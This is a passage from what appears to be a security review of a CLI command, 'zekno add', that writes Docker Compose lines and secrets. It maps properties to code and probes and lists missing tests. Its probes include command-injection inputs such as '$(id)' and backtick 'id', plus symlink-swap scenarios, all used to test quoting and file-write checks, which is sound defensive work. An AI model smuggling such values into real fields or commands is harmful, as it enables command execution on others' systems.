| Property | Enforced at | Checked |
|----------|-------------|---------|
| Nothing written before d; the file compared at a and inside d (`lstat`, `O_NOFOLLOW`, device, inode, one name, owner, SHA-256); a link at the name is CS13 | `add-commit.ts:147-172`; `write.ts:154-205`, `:213-234` | Probe 4: a link to an outside file with the same bytes before d: CS13, the outside file and the store unchanged; a second name before d: AD8 |
| f puts the read bytes back only over exactly what d wrote, never through a link | `add-commit.ts:187-201`; `write.ts:262-288` | Probe 4: the store's folder read-only, and a link to an outside copy of what d wrote put in before f: AD19, the outside copy unchanged, the store unchanged |
| The store is written once, after it was compared with the store read before the question; its write renames a temporary file made with `wx` | `add-commit.ts:174-186`; `profile.ts:126-142` | `add-commit.test.ts`; probe 3 |
| `checkUnchanged`'s change (optional `dev` and `ino`, the opened file compared with the one looked at) is the same check for `writeSettings`, which passes both | `write.ts:163-190` | Read; feature 010's write tests pass |

**The hand-written lines** (`templates/hand.ts`; builders' point 2):

| Property | Enforced at | Checked |
|----------|-------------|---------|
| A bare value starts with a letter, holds only letters, digits and `._/:@-`, does not end with `:` and is no YAML 1.1 word for true, false or null in any case; anything else is `quote`d (`\` and `"` escaped, every `$` as `$$`). So no bare value is a number (they start with a digit, a sign or a dot), `~`, an octal or sexagesimal form, `<<`, an anchor, alias, tag, comment, flow collection, document marker, or holds `: ` or ` #` | `hand.ts:45-55` | Probe 1: 64 values (`1:30`, `0o17`, `017`, `0x1F`, `1e3`, `.5`, `.inf`, `.NaN`, `~`, `null`, `Null`, `nuLL`, `Y`, `yES`, `oN`, `OFF`, `tRuE`, `e3`, `Inf`, `NaN`, `a:b`, `a::b`, `x:30`, `a: b`, `a #b`, `@x`, `` `x ``, `<<`, `&a`, `*a`, `!!str x`, `%x`, `|`, `>`, `? x`, `- x`, `[a]`, `{a: 1}`, quotes, five forms of `$`, backslashes, a URL with `#`, `---`, `...`, empty, `-`, accents, dates, times, `-1`, `+1`, `1_000`, `0b101`) and the names `y`, `Y`, `ON`, `_X`, a service named `on`: each read back by Compose as the very string written |
| No `$` reaches Compose but a secret's `${NAME}`, its name held to the secret-name rule | `hand.ts:57-59`, `:81`; `compose.ts` `quote` | Probe 1: `HOME` and `X` set to marker values were interpolated nowhere; the start command (`"$REDIS_PASSWORD"`, `${REDIS_PASSWORD}`, `$$`, `` `id` ``, `$(id)`, `#`) came back with every `$` literal and no secret's value in `command` |
| The port is left out (no `expose`, no `ports`); `expose` changes nothing between the services of one Compose project | `hand.ts:17-21` | Probe 1: no `ports` key; the service's keys `command, environment, image, restart, volumes` (and Compose's own `entrypoint`, `networks`) |
| A volume line is `- <svc>-<vol>:<path>`; a mount path holds no `:` | `hand.ts:94-101`; `values.ts:59` (`MOUNT_PATH`) | Probe 1: one named volume, `type: volume` |

**The images** (`templates/files/*.json`):

| Property | Checked |
|----------|---------|
| Each pinned by index digest, in the `docker.io/library` form, so only an official image can be named and its bytes cannot change | `publishers.ts:24-40`; probe 9 (`docker image ls --tree`) |
| Each fails closed without its password (research R4) | Probe 10 (T9) |
| No port published, data in a named volume, a client connects with the connection secret, a wrong password refused | `templates-real-docker.test.ts`, run: 4 pass |

**Which file, which app, and nothing contacted** (`ops/add.ts`, `cli/cli.ts`):

| Property | Enforced at | Checked |
|----------|-------------|---------|
| The settings file is the one a deploy here with no flags would sign; SH4 when a pending link names another settings file; a Compose file is never read or written | `ops/settings.ts:141-166`; `ops/add.ts:184-194` | `settings-place.test.ts`; probe 5 (but T2, T3, T4) |
| `zekno add` contacts no server and no network: `--list` and `--show` read the catalogue only; adding opens the team and the store; at a terminal the app is asked for from this machine's history (`offline`) | `cli/cli.ts:454-463`; `asking/asking.ts:136-145` | Probe 3 (plain) and probe 12 (terminal: `Which app on dev?` offering `demo deploy 1`, yes, status 0): `connect` and `fetch` never called; `test/version/version.test.ts` |
| `--for`, `--list`, `--show` on any other command fail as before: the arguments are parsed again with the old table first | `cli/cli.ts:155-196` | `plain-unchanged.test.ts` (a scene each); read: an option only `add` reads before or after another command's name is refused by the old table |
| Any other option given to `zekno add` is AU7 | `cli/cli.ts:231-243` | `add-refusals.test.tsx` |
| No terminal: AD4 without `--yes`, AD12 without `--for`, AH8 | `commands/add.ts:191`, `:226-232`, `:269-276` | `add-scripts.test.ts` |
| A key typed before a question never answers it, the readers question included | `ui/ink/ink.tsx` (`chooseSeveral` through `asking`); `raw-mode.tsx:84-108` | Probe 11: an Enter and a space typed before: the question open, `web` still the only one picked; an Enter after: `["web"]` |

## 4. Tests that are missing

For properties that hold:

- A link put in place of the settings file before step d, and before step f (probe 4); today
  `add-commit.test.ts` makes the folder or the store read-only and rewrites files, but puts no link.
- The hand-written lines of hostile values through `docker compose config`
  (`hand.test.ts:308-396` reads only the first set's values).
- Keys typed before the readers question (`several.test.tsx` has none; probe 11).
- The compiled binary holds the indexed files and no other (probe 9; T057 runs `--list` only).
- The images over a volume that already holds data, with an empty password (T9, read only).
- The docs page's reader from another working folder (T10).

For the findings, once fixed: T1's two files and B's advice followed; T2's sub-folder with
`--app billing`; T3's IN6 on standard error; T4 on a `twin` with only compose.yaml; T5's two offers;
T6's index with a statement more; T7 in `test/docs`.

## 5. Carried over from earlier reviews

**Feature 003**

- C1, trust rebuilt from the signed lists: still true. `prepareAdd` opens the team with `teamOf`,
  `createSecret` seals for the server of the verified team, and `currentSecrets` judges the store
  with that trust. Attacker B can damage the store, which stops the command.
- R4, durable writes: the CLI's profile writes were never flushed; T9 says what that means for the
  window of research R7.
- C5, the hidden prompt: not used by `zekno add`.

**Feature 004**

- P1, a `zekno.json` not signed by the team is never used: still true. `findPlace` and
  `withProject` leave it aside.
- P2, a link's file goes only with its own app: still true for the deploy; not for `zekno add`
  (T2).
- P6 and P7, one reader that keeps a file inside its folder: still true. The settings file is read
  by `readSettingsFile`; no Compose file is read.
- K10, one keychain read per command: `ops/add.test.ts:74` and `add-hand.test.ts:121` count one;
  `--list` and `--show` none.
- K12, typed-ahead keys: still true, the readers question included (probe 11).
- C8 to C10, text cleaned before it is drawn: new lines draw names held to ASCII patterns, the
  server's destination through `sanitize` (`ops/add.ts:315-318`), and the reviewed template's text.
- N1, a token taken as a secret's name: unchanged; `zekno add` names its secrets from the template.

**Feature 005**

- RV1, untrusted code never in a job that may write: still true. The new workflow's one job can
  only read; `runner-release.yml` is unchanged.
- RV7, Bun's caches: a pull request's cache does not reach a release's run (T11).

**Feature 006**

- S3, a "new" app name that is an app already on the server: `zekno add` offers no new app at its
  question (`offerNew: false`).
- With no terminal, every existing command takes its old path: still true
  (`plain-unchanged.test.ts`, help lines only).

**Feature 010**

- S1 and S6, the settings commands follow the deploy's file: still true; `readPlaced` is now
  `findPlace` plus the same three sentences, and feature 010's tests pass unchanged. T3 and T4 are
  `zekno add`'s own use of `findPlace`.
- S2 and S8, invisible characters and blanks at either end: the template's services are held to
  the same rules (probe 2: U+202E refused).
- The Compose text's properties (every string quoted, `$` doubled, fixed keys only): unchanged,
  and the template's services go through `composeText` (FR-020).
- The writer's properties: unchanged for `writeSettings` (`checkUnchanged` is given `dev` and `ino`
  as before).

## 6. What does not change (plan.md)

| Item | State | How |
|------|-------|-----|
| `packages/core`, `apps/runner`, `runner-release.json`: no file changes | Holds | Run: `git diff --stat d19b25f HEAD -- packages/core apps/runner apps/cli/src/version/runner-release.json apps/cli/test/plain/plain-at-head.ts apps/cli/e2e.config.ts apps/cli/tests` prints nothing |
| No message format changes | Holds | Run: `git diff --stat d19b25f HEAD -- apps/cli/src/profile packages` prints nothing; the records `zekno add` writes are `createSecret`'s |
| Plain output and status of every existing command | Holds | Run: `plain-unchanged.test.ts`; `plain-at-head.ts` unchanged (above); `--for`, `--list`, `--show` elsewhere covered there |
| Settings commands, screen and `zekno deploy` unchanged; `readPlaced` keeps every sentence and status | Holds | Run: feature 010's tests (part 1); read: `readPlaced` is `findPlace` plus SH1 to SH3 |
| Feature 010's settings file: no rule, sentence or limit changes | Holds | Read: `schema.ts` moves steps 3 to 6 into `checkSettingsValue`, which `checkSettings` calls; `compose.ts` moves two lines into `limitLines`; run: `test/settings`, among the 1,025 of part 1 |
| Secrets: no value in any file but its record, any output, error or argument | Holds | Run: probe 3; `add-commit.test.ts` (SC-002) |
| No command but `version` and `doctor` calls `deps.fetch` | Holds | Run: `test/version`; probes 3 and 12 |
| `INSTALL_SCRIPT` and `CHECK_SCRIPT` byte for byte | Holds | Run: `git diff d19b25f` of their files is empty; `check-script.test.ts` and `install/script.test.ts` pass |
| The existing workflows unchanged | Holds | Run: `git diff --stat d19b25f HEAD -- .github` names only the new file |

The builders' point 1 (`AddTarget.both`) is T3; point 2 is part 3, "The hand-written lines"; point 3
is T9; point 4 is T10; point 5 is part 3, "The catalogue"; point 6 is T11, with T7 for what the
guide does not say.
